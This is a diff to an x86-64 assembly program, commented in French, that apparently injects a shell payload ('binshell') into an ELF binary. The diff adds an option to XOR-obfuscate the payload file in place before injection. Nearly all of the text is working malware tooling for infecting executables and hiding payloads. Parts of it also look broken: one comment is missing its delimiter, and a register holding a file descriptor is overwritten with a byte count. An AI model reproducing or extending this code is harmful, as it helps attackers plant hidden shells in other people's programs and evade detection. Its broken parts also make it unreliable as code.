@@ -54,7 +54,7 @@ global _start
 
 _start:
 	mov rax, [rsp]          ; Nombre d'argument argc
-    cmp rax, 3
+    cmp rax, 4
     jne erreur
 
     mov rdi, [rsp + 16]     ; argv[0] nom du fichier executé, argv[1] = nom du fichier ELF
@@ -230,12 +230,14 @@ fin_recherche:
 
 	mov r12, rax			; R12 = offset de fin du fichier
 
-	mov rdi, [rsp + 32] 		; payload_name exemple binshell
 
+	mov r15, [rsp + 32] 		; A déchiffrer oui ou non
 
+		
+	mov rdi, [rsp + 24] 		; payload_name exemple binshell
 	mov rax, 2
 	;mov rdi, payload_name
-	mov rsi, 0
+	mov rsi, 2
 	mov rdx, 0
 	syscall		; Ouvre le payload
 
@@ -246,6 +248,53 @@ fin_recherche:
 	jbe erreur
 
 	mov r14, rax
+	mov r9, rax
+	
+	cmp byte [r15], '0'
+	jne not_xor
+
+read_loop:
+
+    mov     rax, 0              
+    mov     rdi, r14           
+    mov     rsi, buffer
+    mov     rdx, 4096       ; lecture du shell
+    syscall
+
+    cmp rax, 0
+    jl erreur
+    jz not_xor        Si vide quitter
+
+    mov r14, rax 
+
+    xor rcx, rcx  
+
+xor_loop:
+
+    cmp rcx, r14
+    jge write_output
+
+    xor byte [buffer + rcx], xor_key        ; Modifie avec xor octet par octet
+
+    inc rcx
+    jmp xor_loop
+
+    write_output:
+
+    mov     rax, 1              ; Ecrire dans le payload
+    mov     rdi, r9
+    mov     rsi, buffer
+    mov     rdx, r14
+    syscall
+
+    cmp rax, 0
+    jl erreur
+
+    jmp read_loop
+
+
+not_xor:
+
 
 	mov rax, 0
 	mov rdi, r14
